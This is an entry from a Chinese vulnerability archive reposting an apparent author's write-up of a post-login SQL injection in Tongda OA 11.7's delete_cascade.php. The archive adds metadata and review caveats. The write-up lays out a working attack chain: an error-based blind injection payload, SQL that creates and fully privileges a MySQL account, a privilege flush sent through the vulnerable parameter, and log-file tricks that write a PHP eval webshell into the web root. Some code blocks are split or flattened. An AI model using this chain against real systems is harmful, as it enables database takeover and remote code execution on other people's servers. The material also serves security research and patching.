---
source: "MrWQ/vulnerability-paper"
title: "通达OA delete_cascade SQL 注入至日志写入"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "11.7"
prerequisites: "登录；应用DB授权/日志及文件写权限"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/rtX9mJkPHd9njvM_PIrK_Q"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.7%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E5%88%B0RCE%5B0day%5D.md"
category_recommendation: "OA / 通达"
id: "vw-72e4a740861bd65f53e11a15"
entity_id: "ve-72e4a740861bd65f53e11a15"
schema_version: "1"
---

# 通达OA delete_cascade SQL 注入至日志写入

## 条目说明

- 对象与具体问题：通达OA；delete_cascade SQLi至日志写入
- 版本、配置及部署条件：11.7
- 认证与权限前提：登录；应用DB授权/日志及文件写权限
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 根因addslashes再撤销解释有价值，主要代码图未视检
- SQL字符串被拆两个代码块，日志语句反引号压平，图片包在代码块内
- password_expired=Y人为制造后续故障，应解释而非通用必经步骤
- 0day历史题应标日期；账号授权和日志改变无回滚

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rtX9mJkPHd9njvM_PIrK_Q)

> Author: AdminTony

  

1.测试环境
======

测试版本：通达OA v11.7版本

限制条件：需要账号登录

2.代码审计发现注入
==========

注入出现在`general/hr/manage/query/delete_cascade.php`文件中，代码实现如下：

![图片](../../.resource/remote/abe4db97433b245479daa9667beef70091d296774cd100840c16c77ddb60e3af.png "image.png")

首先判断`$condition_cascade`是否为空，如果不为空，则将其中的`\'`替换为`'`。为什么要这样替换呢，主要是因为V11.7版本中，注册变量时考虑了安全问题，将用户输入的字符用`addslashes`函数进行保护，如下：

`inc/common.inc.php`代码

![图片](../../.resource/remote/90479fe151a2820fb0cfdc88af2b1a29cf404140f6278371a41294097b13e820.png "image.png")

因为是无回显机制，是盲注，所以尝试`(select 1 from (select sleep(5))a)`，结果没那么简单：

![图片](../../.resource/remote/cc5c62c21b407a54d92b17e7c019c891f14a8691eb67163da80d1c3b443afb1a.png "image.png")

触发了通达OA的过滤机制，翻看代码，在`inc/conn.php`文件中找到过滤机制如下:

![图片](../../.resource/remote/f022115fdd3d850beef4a3d60cebf92bfb24726e6fbcd46609ba6b31452619de.png "image.png")

其过滤了一些字符，但是并非无法绕过，盲注的核心是：`substr、if`等函数，均未被过滤，所以还是有机会的。

传入错误的SQL语句时，页面出错：

![图片](../../.resource/remote/b0edbd93b920b8b94f6ab05d8b5259a4f51d5af300de0abb485a86e9ee8ae090.webp "image.png")

那么只要构造MySQL报错即可配合`if`函数进行盲注了，翻看局外人师傅在补天白帽大会上的分享，发现`power(9999,99)`也可以使数据库报错，所以构造语句：

```
select if((substr(user(),1,1)='r'),1,power(9999,99)) # 当字符相等时，不报错，错误时报错
```

![图片](../../.resource/remote/6ef11344a7d6e970acfade240b8fbe324803d7d6cc8e42cecc28071fcddd186d.png "image.png")

![图片](../../.resource/remote/25706201ee1ca000a10df8dc31dd023415ab91bd2e69a0ca4e90ac197bdf7d1b.png "image.png")

3.构造利用链
=======

*   添加用户：
    

```
grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@123' WITH GRANT OPTION
```

```
![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXlqH7X8bvq6uMPjj4SfeiaBS0aCwwQqNPoojRYru8ejmfetI4iaRmqMTlg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")  

```

![图片](../../.resource/remote/f83c19b09ae2f26c03455ae5e762663a47a326d67899c884a92cfb144ed799fa.png "image.png")

然后该用户是对mysql数据库拥有所有权限的,然后给自己加权限：

```
UPDATE `mysql`.`user` SET `Password` = '*DE0742FA79F6754E99FDB9C8D2911226A5A9051D', `Select_priv` = 'Y', `Insert_priv` = 'Y', `Update_priv` = 'Y', `Delete_priv` = 'Y', `Create_priv` = 'Y', `Drop_priv` = 'Y', `Reload_priv` = 'Y', `Shutdown_priv` = 'Y', `Process_priv` = 'Y', `File_priv` = 'Y', `Grant_priv` = 'Y', `References_priv` = 'Y', `Index_priv` = 'Y', `Alter_priv` = 'Y', `Show_db_priv` = 'Y', `Super_priv` = 'Y', `Create_tmp_table_priv` = 'Y', `Lock_tables_priv` = 'Y', `Execute_priv` = 'Y', `Repl_slave_priv` = 'Y', `Repl_client_priv` = 'Y', `Create_view_priv` = 'Y', `Show_view_priv` = 'Y', `Create_routine_priv` = 'Y', `Alter_routine_priv` = 'Y', `Create_user_priv` = 'Y', `Event_priv` = 'Y', `Trigger_priv` = 'Y', `Create_tablespace_priv` = 'Y', `ssl_type` = '', `ssl_cipher` = '', `x509_issuer` = '', `x509_subject` = '', `max_questions` = 0, `max_updates` = 0, `max_connections` = 0, `max_user_connections` = 0, `plugin` = 'mysql_native_password', `authentication_string` = '', `password_expired` = 'Y' WHERE `Host` = Cast('%' AS Binary(1)) AND `User` = Cast('at666' AS Binary(5));
```

```
![图片](https://mmbiz.qpic.cn/mmbiz_png/BibfH6dHpibZLHmSUUBblibBibDJlnHGtbXl1lZZM0xo4A1K7G9MK9rzs3q9XGPZKwbZNQMSah7hrCBn3S4oEpo9jA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "image.png")  

```

然后用注入点刷新权限，因为该用户是没有刷新权限的权限的：`general/hr/manage/query/delete_cascade.php?condition_cascade=flush privileges;`这样就拥有了所有权限。再次登录：

![图片](../../.resource/remote/ef2051dfd81e90e72929a5d974deee9ab2873fab2408c00e3393a3dcad46e5c6.png "image.png")

提示这个，或者让改密码死活改不了。再执行一下

```
grant all privileges ON mysql.* TO 'at666'@'%' IDENTIFIED BY 'abcABC@1
```

```
23' WITH GRANT OPTION  

```

即可。

![图片](../../.resource/remote/a9cfdf255dcba6a35c7626ad8f1724b6bf2edcc376fd9633d3e89a595f9b58df.png "image.png")

*   写shell：
    

```
`# 查路径：``select @@basedir; # c:\td0a117\mysql5\，那么web目录就是c:\td0a117\webroot\``# 方法1：``set global slow_query_log=on;``set global slow_query_log_file='C:/td0a117/webroot/tony.php';``select '<?php eval($_POST[x]);?>' or sleep(11);``# 方法2：``set global general_log = on;``set global general_log_file = 'C:/td0a117/webroot/tony2.php';``select '<?php eval($_POST[x]);?>';``show variables like '%general%';`
```

(原资料此处为空，未提供请求或代码。)

![图片](../../.resource/remote/b95106265e487a5c62c632fdff90badd0750d268a4772053a020892f9af16322.webp "image.png")

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
